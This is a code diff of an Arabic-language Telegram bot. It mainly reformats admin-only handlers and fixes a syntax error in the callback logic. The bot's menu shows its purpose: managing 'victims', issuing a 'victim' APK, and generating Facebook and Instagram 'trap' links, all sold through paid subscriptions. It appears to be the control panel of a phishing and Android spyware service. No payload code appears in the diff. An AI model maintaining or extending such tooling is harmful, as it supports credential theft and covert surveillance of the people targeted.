@@ -55,7 +55,7 @@ def h(text):
 
 
 # ============================================================
-# ★★★ إعدادات التحديث ★★★
+# إعدادات التحديث
 # ============================================================
 try:
     from config import ORIGIN_SECRET
@@ -87,7 +87,7 @@ def main_menu(user_id=None):
     markup.add(InlineKeyboardButton("👥 إدارة الضحايا", callback_data="v_list"))
     markup.add(InlineKeyboardButton("📱 تطبيق الضحية (APK)", callback_data="v_new"))
 
-    # 🌐 لوحة التحكم الويب
+    # لوحة التحكم الويب
     markup.add(InlineKeyboardButton(
         "🌐 لوحة التحكم (ويب)",
         callback_data="open_dashboard"
@@ -97,7 +97,7 @@ def main_menu(user_id=None):
     markup.add(InlineKeyboardButton("🔗 توليد رابط مصيدة فيسبوك", callback_data="gen_fb"))
     markup.add(InlineKeyboardButton("📸 توليد رابط مصيدة انستقرام", callback_data="gen_ig"))
 
-    # ← الأماكن الجديدة للأدوات القادمة
+    # ← أماكن الأدوات الجديدة
 
     # الاشتراكات
     markup.add(InlineKeyboardButton("💎 الاشتراكات والدفع", callback_data="payment_menu"))
@@ -470,7 +470,7 @@ def _handle_callback(call, chat_id, user_id, data):
     """المنطق الفعلي للـ callback"""
 
     # ============================================================
-    # 🌐 فتح Dashboard
+    # فتح Dashboard
     # ============================================================
     if data == "open_dashboard":
         bot.answer_callback_query(call.id, "🔄 جاري تجهيز الرابط...")
@@ -1191,7 +1191,8 @@ def _handle_callback(call, chat_id, user_id, data):
         return
 
     if data.startswith("admin_users_"):
-        if not is_admin(user_id): return
+        if not is_admin(user_id):
+            return
         try:
             page = int(data.replace("admin_users_", ""))
         except ValueError:
@@ -1208,7 +1209,8 @@ def _handle_callback(call, chat_id, user_id, data):
         return
 
     if data.startswith("admin_user_"):
-        if not is_admin(user_id): return
+        if not is_admin(user_id):
+            return
         try:
             uid = int(data.replace("admin_user_", ""))
         except ValueError:
@@ -1224,7 +1226,8 @@ def _handle_callback(call, chat_id, user_id, data):
         return
 
     if data.startswith("admin_ban_user_"):
-        if not is_admin(user_id): return
+        if not is_admin(user_id):
+            return
         try:
             uid = int(data.replace("admin_ban_user_", ""))
         except ValueError:
@@ -1234,7 +1237,8 @@ def _handle_callback(call, chat_id, user_id, data):
         return
 
     if data.startswith("admin_unban_user_"):
-        if not is_admin(user_id): return
+        if not is_admin(user_id):
+            return
         try:
             uid = int(data.replace("admin_unban_user_", ""))
         except ValueError:
@@ -1244,7 +1248,8 @@ def _handle_callback(call, chat_id, user_id, data):
         return
 
     if data.startswith("admin_grant_vip_user_"):
-        if not is_admin(user_id): return
+        if not is_admin(user_id):
+            return
         try:
             uid = int(data.replace("admin_grant_vip_user_", ""))
         except ValueError:
@@ -1260,7 +1265,8 @@ def _handle_callback(call, chat_id, user_id, data):
         return
 
     if data.startswith("admin_remove_vip_"):
-        if not is_admin(user_id): return
+        if not is_admin(user_id):
+            return
         try:
             uid = int(data.replace("admin_remove_vip_", ""))
         except ValueError:
@@ -1272,7 +1278,8 @@ def _handle_callback(call, chat_id, user_id, data):
         return
 
     if data.startswith("admin_delete_user_"):
-        if not is_admin(user_id): return
+        if not is_admin(user_id):
+            return
         try:
             uid = int(data.replace("admin_delete_user_", ""))
         except ValueError:
@@ -1282,7 +1289,8 @@ def _handle_callback(call, chat_id, user_id, data):
         return
 
     if data.startswith("admin_give_sub_"):
-        if not is_admin(user_id): return
+        if not is_admin(user_id):
+            return
         try:
             uid = int(data.replace("admin_give_sub_", ""))
         except ValueError:
@@ -1300,9 +1308,11 @@ def _handle_callback(call, chat_id, user_id, data):
         return
 
     if data.startswith("admin_activate_"):
-        if not is_admin(user_id): return
+        if not is_admin(user_id):
+            return
         parts = data.replace("admin_activate_", "").rsplit("_", 1)
-        if len(parts) != 2: return
+        if len(parts) != 2:
+            return
         plan_key, uid_str = parts
         try:
             uid = int(uid_str)
@@ -1325,7 +1335,8 @@ def _handle_callback(call, chat_id, user_id, data):
         return
 
     if data == "admin_stats":
-        if not is_admin(user_id): return
+        if not is_admin(user_id):
+            return
         bot.answer_callback_query(call.id)
         bot.send_message(chat_id, build_admin_stats_text(),
                          reply_markup=InlineKeyboardMarkup().add(
@@ -1334,7 +1345,8 @@ def _handle_callback(call, chat_id, user_id, data):
         return
 
     if data == "admin_recent":
-        if not is_admin(user_id): return
+        if not is_admin(user_id):
+            return
         users = get_all_users()
         users.sort(key=lambda u: u.get("created_at", ""), reverse=True)
         lines = ["🆕 <b>آخر 10 مستخدمين:</b>"]
@@ -1351,60 +1363,79 @@ def _handle_callback(call, chat_id, user_id, data):
         return
 
     if data == "admin_search":
-        if not is_admin(user_id): return
+        if not is_admin(user_id):
+            return
         bot.answer_callback_query(call.id)
         msg = bot.send_message(chat_id, "🔍 <b>أرسل ID أو username:</b>", parse_mode="HTML")
         bot.register_next_step_handler(msg, admin_search_handler)
         return
 
     if data == "admin_broadcast":
-        if not is_admin(user_id): return
+        if not is_admin(user_id):
+            return
         bot.answer_callback_query(call.id)
         msg = bot.send_message(chat_id, "📢 <b>أرسل الرسالة:</b>", parse_mode="HTML")
         bot.register_next_step_handler(msg, admin_broadcast_handler)
         return
 
     if data == "admin_ban":
-        if not is_admin(user_id): return
+        if not is_admin(user_id):
+            return
         bot.answer_callback_query(call.id)
         msg = bot.send_message(chat_id, "🚫 <b>أرسل ID للحظر:</b>", parse_mode="HTML")
         bot.register_next_step_handler(msg, admin_ban_handler)
         return
 
     if data == "admin_unban":
-        if not is_admin(user_id): return
+        if not is_admin(user_id):
+            return
         bot.answer_callback_query(call.id)
         msg = bot.send_message(chat_id, "✅ <b>أرسل ID لفك الحظر:</b>", parse_mode="HTML")
         bot.register_next_step_handler(msg, admin_unban_handler)
         return
 
     if data == "admin_delete":
-        if not is_admin(user_id): return
+        if not is_admin(user_id):
+            return
         bot.answer_callback_query(call.id)
         msg = bot.send_message(chat_id, "🗑️ <b>أرسل ID للحذف:</b>", parse_mode="HTML")
         bot.register_next_step_handler(msg, admin_delete_handler)
         return
 
     if data == "admin_grant_vip":
-        if not is_admin(user_id): return
+        if not is_admin(user_id):
+            return
         bot.answer_callback_query(call.id)
         msg = bot.send_message(chat_id, "💎 <b>أرسل ID لمنح VIP:</b>", parse_mode="HTML")
         bot.register_next_step_handler(msg, admin_grant_vip_handler)
-        return    if data == "admin_give_stars":
-        if not is_admin(user_id): return
+        return
+
+    # ★★★ النقطة اللي كانت فيها مشكلة — تم إصلاحها ★★★
+    if data == "admin_give_stars":
+        if not is_admin(user_id):
+            return
         bot.answer_callback_query(call.id)
-        msg = bot.send_message(chat_id, "⭐ <b>أرسل:</b> <code>user_id|amount</code>", parse_mode="HTML")
+        msg = bot.send_message(
+            chat_id,
+            "⭐ <b>أرسل:</b> <code>user_id|amount</code>",
+            parse_mode="HTML"
+        )
         bot.register_next_step_handler(msg, admin_give_stars_handler)
         return
 
     if data.startswith("admin_msg_user_"):
-        if not is_admin(user_id): return
+        if not is_admin(user_id):
+            return
         try:
             uid = int(data.replace("admin_msg_user_", ""))
         except ValueError:
             return
         bot.answer_callback_query(call.id)
-        msg = bot.send_message(chat_id, f"📨 <b>أرسل الرسالة لـ</b> <code>{uid}</code>:", parse_mode="HTML")
+        msg = bot.send_message(
+            chat_id,
+            f"📨 <b>أرسل الرسالة لـ</b> <code>{uid}</code>:",
+            parse_mode="HTML"
+        )
         bot.register_next_step_handler(msg, lambda m, u=uid: admin_msg_user_handler(m, u))
         return
 
@@ -1811,7 +1842,8 @@ def apk_url_step(message, device_id):
 # ============================================================
 
 def admin_search_handler(message):
-    if not is_admin(message.chat.id): return
+    if not is_admin(message.chat.id):
+        return
     query = (message.text or "").strip().lstrip("@")
     users = get_all_users()
     found = [u for u in users
@@ -1830,15 +1862,18 @@ def admin_search_handler(message):
 
 
 def admin_broadcast_handler(message):
-    if not is_admin(message.chat.id): return
+    if not is_admin(message.chat.id):
+        return
     text = message.text
-    if not text: return
+    if not text:
+        return
     users = get_all_users()
     success = failed = 0
     status_msg = bot.send_message(message.chat.id, f"📢 جاري الإرسال لـ {len(users)}...")
     for u in users:
         uid = u.get("user_id")
-        if u.get("is_banned"): continue
+        if u.get("is_banned"):
+            continue
         try:
             bot.send_message(uid, f"📢 <b>رسالة من الإدارة:</b>\n\n{h(text)}", parse_mode="HTML")
             success += 1
@@ -1856,7 +1891,8 @@ def admin_broadcast_handler(message):
 
 
 def admin_ban_handler(message):
-    if not is_admin(message.chat.id): return
+    if not is_admin(message.chat.id):
+        return
     try:
         uid = int((message.text or "").strip())
     except ValueError:
@@ -1866,7 +1902,8 @@ def admin_ban_handler(message):
 
 
 def admin_unban_handler(message):
-    if not is_admin(message.chat.id): return
+    if not is_admin(message.chat.id):
+        return
     try:
         uid = int((message.text or "").strip())
     except ValueError:
@@ -1876,7 +1913,8 @@ def admin_unban_handler(message):
 
 
 def admin_delete_handler(message):
-    if not is_admin(message.chat.id): return
+    if not is_admin(message.chat.id):
+        return
     try:
         uid = int((message.text or "").strip())
     except ValueError:
@@ -1886,7 +1924,8 @@ def admin_delete_handler(message):
 
 
 def admin_grant_vip_handler(message):
-    if not is_admin(message.chat.id): return
+    if not is_admin(message.chat.id):
+        return
     try:
         uid = int((message.text or "").strip())
     except ValueError:
@@ -1902,7 +1941,8 @@ def admin_grant_vip_handler(message):
 
 
 def admin_give_stars_handler(message):
-    if not is_admin(message.chat.id): return
+    if not is_admin(message.chat.id):
+        return
     try:
         parts = (message.text or "").split("|")
         uid = int(parts[0].strip())
@@ -1919,7 +1959,8 @@ def admin_give_stars_handler(message):
 
 
 def admin_msg_user_handler(message, uid):
-    if not is_admin(message.chat.id): return
+    if not is_admin(message.chat.id):
+        return
     try:
         bot.send_message(uid, f"📨 <b>من الإدارة:</b>\n\n{h(message.text)}", parse_mode="HTML")
         bot.send_message(message.chat.id, "✅ تم الإرسال", parse_mode="HTML")
